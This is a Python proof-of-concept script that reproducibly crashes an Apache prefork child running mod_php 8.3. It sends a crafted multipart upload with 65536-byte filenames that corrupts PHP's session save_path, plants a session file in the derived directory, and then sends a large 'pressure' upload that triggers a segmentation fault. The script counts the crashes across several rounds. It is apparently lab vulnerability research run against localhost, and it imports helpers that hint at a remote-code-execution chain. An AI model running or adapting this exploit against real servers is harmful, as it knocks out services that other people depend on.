#!/usr/bin/env python3
"""kill_apache.py - reproducible SIGSEGV kill receipt, Apache prefork + mod_php 8.3.

Recipe (all steps observed on the lab, ASLR off):
  1. ARM   20 file parts with 65536-byte filenames -> pre-RINIT OOM at the END
           decode, HTTP 500, child survives, session tree written (1.18 MB).
           The arm also leaves PS(save_path) pointing into its own
           Content-Type header, so the NEXT request resolves the session as
           "ndary=<boundary>/sess_<id>" relative to Apache's cwd (/).
  2. The armed tree is copied into that directory; otherwise the pressure
     request decodes an empty session.
  3. PRESSURE  950 parts of 4000 bytes -> SIGSEGV inside
     rfc1867_post_handler -> php_session_flush -> php_session_reset_id ->
     session_adapt_url. Apache logs "child pid N exit signal Segmentation
     fault (11)" and respawns.

Both FIFO order and the exact boundary are load-bearing: the path is derived
from the boundary string, so changing BND changes the directory name.

Usage: python3 kill_apache.py [--rounds N] [--parts N]
"""
import argparse
import os
import subprocess
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import poc_unserialize as P

URL = "http://127.0.0.1:18120/index.php"
BND = b"UctxPoc2026"
MALDIR = "/ndary=UctxPoc2026"          # = the corrupted save_path
LAB = "/tmp/php2shell_ap"
SESS = LAB + "/sess"
ERRLOG = LAB + "/error.log"
ARM_PARTS, ARM_NAMELEN = 20, 65536


def restarted_child():
    outopy = subprocess.run(["sudo", "bash", LAB + "/rce_lab.sh"],
                            capture_output=True, text=True).stdout
    parent = int(outopy.split("parent=")[1].split()[0])
    child = int(outopy.split("child=")[1].split()[0])
    return parent, child


def child_of(parent):
    r = subprocess.run(["pgrep", "-P", str(parent)], capture_output=True, text=True).stdout.split()
    return int(r[0]) if r else None


def segv_count():
    try:
        return open(ERRLOG, errors="replace").read().count("exit signal Segmentation")
    except OSError:
        return 0


def pressure_body(sid, parts, size=4000):
    out = bytearray()
    out += P.mp_part(BND, b"PHPSESSID", sid.encode())
    out += P.mp_part(BND, b"PHP_SESSION_UPLOAD_PROGRESS", b"x")
    for _ in range(parts):
        out += P.mp_part(BND, b"fill[]", b"P" * size)
    out += b"--" + BND + b"--\r\n"
    return bytes(out)


def one_round(idx, parts, verbose=True):
    parent, child0 = restarted_child()
    subprocess.run(["sudo", "mkdir", "-p", MALDIR], check=False)
    subprocess.run(["sudo", "rm", "-f"] + [os.path.join(MALDIR, f) for f in os.listdir(MALDIR)]
                   if os.path.isdir(MALDIR) else ["true"], check=False)
    sid = "ap%dabc" % idx
    before_segv = segv_count()

    st, _d, _dt = P.send(URL, P.arm_body(sid, BND, ARM_PARTS, ARM_NAMELEN), BND, sid, 0, 0)
    src = "%s/sess_%s" % (SESS, sid)
    if not os.path.exists(src):
        return False, "no session file written (arm status %s)" % st
    size = os.path.getsize(src)
    if size < 500000:
        return False, "session tree too small (%d bytes)" % size
    dst = "%s/sess_%s" % (MALDIR, sid)
    subprocess.run(["sudo", "cp", src, dst], check=False)
    subprocess.run(["sudo", "chmod", "666", dst], check=False)

    t0 = time.time()
    pst, _pd, _pdt = P.send(URL, pressure_body(sid, parts), BND, sid, 0, 0)
    elapsed = time.time() - t0
    time.sleep(1.5)

    child1 = child_of(parent)
    new_segvst = segv_count() - before_segv
    crashed = (child1 != child0) or new_segvst > 0
    if verbose:
        print("round %d: arm=%s tree=%d pressure=%s %.1fs child %s->%s new_segv=%d => %s"
              % (idx, st, size, pst, elapsed, child0, child1, new_segvst,
                 "SIGSEGV" if crashed else "no crash"))
    return crashed, ""


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--rounds", type=int, default=3)
    ap.add_argument("--parts", type=int, default=950)
    ap.add_argument("--require", type=int, default=0,
                    help="fail unless at least this many rounds crash")
    a = ap.parse_args()
    ok = 0
    for i in range(a.rounds):
        crashed, why = one_round(i, a.parts)
        if crashed:
            ok += 1
        elif why:
            print("round %d: %s" % (i, why))
    print("RESULT %d/%d crashed" % (ok, a.rounds))
    if a.require and ok < a.require:
        sys.exit(1)


if __name__ == "__main__":
    main()
